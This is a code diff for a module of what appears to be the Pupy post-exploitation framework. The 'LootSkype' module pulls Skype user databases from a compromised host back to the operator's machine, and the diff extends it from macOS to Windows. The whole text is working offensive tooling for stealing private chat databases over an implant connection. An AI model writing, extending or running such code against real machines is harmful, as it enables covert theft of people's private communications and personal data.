@@ -17,7 +17,7 @@ from itertools import compress
 
 __class_name__="LootSkype"
 
-@config(cat="gather", compatibilities=['darwin'], tags=['gather', 'skype'])
+@config(cat="gather", compatibilities=['darwin', 'windows'], tags=['gather', 'skype'])
 class LootSkype(PupyModule):
 
     """ download the skype databases """
@@ -34,6 +34,8 @@ class LootSkype(PupyModule):
 
         if self.client.is_darwin():
             self.darwin()
+        elif self.client.is_windows():
+            self.windows()
 
     def darwin(self):
         self.client.load_package("lootskype")
@@ -42,6 +44,22 @@ class LootSkype(PupyModule):
             looted_dbs = []
             for index, db in enumerate(dbs):
                 db_name = db.split('/')[-2] + '.db'
+                user_db = os.path.join(self.rep, db_name)
+                self.log('Looting database for Skype user {0} ({1}/{2})'.format( db_name, (index+1), len(dbs)))
+                download(self.client.conn, db, user_db)
+                looted_dbs.append(user_db)
+
+            self.success("Skype databases looted, search the databases with gather/search_skype :)")
+        else:
+            self.error('no Skype databases found')
+
+    def windows(self):
+        self.client.load_package("lootskype")
+        dbs = self.client.conn.modules["lootskype"].dump()
+        if dbs:
+            looted_dbs = []
+            for index, db in enumerate(dbs):
+                db_name = db.split('\\')[-2] + '.db'
                 user_db = os.path.join(self.rep, db_name)
                 self.log('Looting database for Skype user {0} ({1}/{2})'.format( db_name, (index+1), len(dbs)))
                 download(self.client.conn, db, user_db)
